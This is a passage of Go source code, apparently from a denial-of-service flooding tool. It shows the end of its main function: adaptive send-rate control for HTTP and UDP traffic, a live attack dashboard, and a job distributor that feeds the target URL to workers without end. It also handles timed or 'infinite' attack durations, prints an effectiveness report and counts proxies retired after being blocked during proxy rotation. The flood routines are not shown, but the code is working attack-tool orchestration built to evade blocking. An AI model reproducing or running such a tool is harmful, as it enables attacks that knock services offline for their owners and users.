	atomic.StoreUint64(&targetResponding, 1)

	// adaptive backoff: when the health monitor flags LOCAL congestion (our uplink
	// saturated, not the target down), auto-throttle the send rate and ramp back as
	// it clears. on by default, overshooting our own uplink never helped anyway.
	if *adaptiveBW {
		// throttle both the HTTP request limiter and the live UDP egress limiter on
		// self-congestion; whichever the running attack uses gets backed off.
		udpBase := 0.0
		if bwLimiter != nil {
			udpBase = float64(bwLimiter.Limit())
		}
		go adaptiveCongestionControl(ctx, limiter, float64(*rateLimit), bwLimiter, udpBase, logger)
	}

	// Professional graceful shutdown handler
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-stop
		logger.Info("Graceful shutdown initiated by user signal")
		fmt.Printf("%s", StyleText("\n[stop] shutting down", ColorYellow)+"\n")
		fmt.Printf("cancelling all in-flight work...\n")
		// cancel() propagates to every goroutine that holds ctx, no need to
		// also close(jobs) here. closing a channel while the distributor may
		// still be blocked sending on it causes a panic (even with recover it
		// leaves the jobs buffer in an indeterminate state).
		cancel()
	}()

	// Professional real-time dashboard. renders each frame as a single in-place
	// write (cursor-home, no full-screen clear) so it repaints smoothly instead of
	// flickering, and while it's up the logger is muted to the file so stray log
	// lines can't shove the frame around. quiet mode skips the dashboard entirely.
	go func() {
		if *quietMode {
			return
		}
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		// Initial setup delay, let the "starting" screen sit briefly before the
		// dashboard takes over the terminal.
		time.Sleep(3 * time.Second)

		clearScreen() // one full clear to wipe the intro; frames overwrite in place after
		hideCursor()
		dashboardActive.Store(true)
		defer func() {
			dashboardActive.Store(false)
			showCursor()
		}()

		for {
			select {
			case <-ctx.Done():
				logger.Debug("Dashboard monitoring terminated")
				return
			case <-ticker.C:
				// skip the redraw if ctx was just cancelled, repainting would wipe
				// the shutdown message printed by the signal handler
				if ctx.Err() == nil {
					renderFrame(targetURL, config.AttackType)
				}
			}
		}
	}()

	// Professional job distribution engine
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logger.Error(fmt.Sprintf("Job distribution panic recovered: %v", r))
			}
		}()

		logger.Debug("Job distribution engine started")
		for {
			select {
			case <-ctx.Done():
				logger.Debug("Job distribution engine terminated")
				return
			default:
				select {
				case jobs <- targetURL:
					// Job distributed successfully
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	// Professional completion monitoring with duration support
	shutdownComplete := make(chan struct{})
	timeoutReached := make(chan struct{})

	go func() {
		wg.Wait()
		logger.Info("All workers completed gracefully")
		close(shutdownComplete)
	}()

	// Monitor for timeout if duration is set
	if attackDuration > 0 {
		go func() {
			<-ctx.Done()
			if ctx.Err() == context.DeadlineExceeded {
				logger.Info(fmt.Sprintf("Attack duration of %v completed", attackDuration))
				fmt.Printf("%s", StyleText("\n[ok] attack duration completed", ColorGreen)+"\n")
				fmt.Printf("Configured duration of %v reached.\n", attackDuration)
				fmt.Printf("Initiating graceful shutdown...\n")
				close(timeoutReached)
			}
		}()
	}

	// Execute with professional timeout/completion handling.
	// the signal handler only calls cancel(), workers drain themselves via
	// ctx.Done(). if they somehow stall (e.g. a bug in a transport layer),
	// the 5s hard exit below prevents the process from hanging forever.
	gracefulExit := make(chan struct{})
	go func() {
		// unblock this waiter as soon as ctx is cancelled, then give workers a few
		// seconds to finish current work before we stop waiting.
		<-ctx.Done()
		select {
		case <-shutdownComplete:
			// clean exit, all workers drained in time
		case <-time.After(3 * time.Second):
			// workers (usually lingering held connections) didn't drain. do NOT
			// os.Exit here, that was killing the process BEFORE the final report
			// printed, which is why the end-of-run output kept vanishing. just stop
			// waiting; main falls through to print the report and then exits, which
			// tears down any stragglers anyway.
			logger.Warning("workers did not drain in 3s — proceeding to final report")
		}
		close(gracefulExit)
	}()

	select {
	case <-shutdownComplete:
		logger.Info("shutdown completed — all workers exited cleanly")
	case <-gracefulExit:
		logger.Info("shutdown completed after signal")
	case <-timeoutReached:
		logger.Info("Attack completed after reaching configured duration")
		// Give workers time to finish gracefully
		select {
		case <-shutdownComplete:
			logger.Info("All workers completed after timeout")
		case <-time.After(10 * time.Second):
			logger.Warning("Force shutdown after 10 seconds grace period")
			fmt.Printf("%s", StyleText("[!] force termination after grace period", ColorYellow)+"\n")
		}
	case <-time.After(func() time.Duration {
		if attackDuration > 0 {
			return attackDuration + 15*time.Second // Add buffer for timeout attacks
		}
		return 365 * 24 * time.Hour // Effectively infinite for infinite attacks
	}()):
		logger.Warning("Emergency force shutdown triggered")
		fmt.Printf("%s", StyleText("[!] emergency force termination", ColorRed)+"\n")
	}

	// Professional completion report. hand the terminal back: stop the dashboard
	// from owning the screen (re-enables console logging) and restore the cursor the
	// dashboard hid, so the report and any final logs actually render and persist.
	dashboardActive.Store(false)
	showCursor()
	logger.Info("generating report")
	clearScreen()
	printHeader()
	printEffectivenessReport()
	printPerTypeSummary()

	if evicted := legacyProxyPool.EvictedCount(); evicted > 0 {
		logger.Info(fmt.Sprintf("proxy health: retired %d dead/blocked proxies during the run", evicted))
		fmt.Printf("proxy health: retired %s dead/blocked proxies during the run\n",
			StyleText(fmt.Sprintf("%d", evicted), ColorYellow))
	}

	// NOTE: we intentionally do NOT re-save the config here. demon_config.json is
	// written once, on first run when it doesn't exist (see startup above). saving
	// the fully-resolved config on every exit made command-line flags "stick", e.g.
	// a single `-rotate-proxy=false` would silently persist and disable proxy rotation
	// for all later runs. flags are now transient; the file changes only when you edit it.

	logger.Info("done")
}
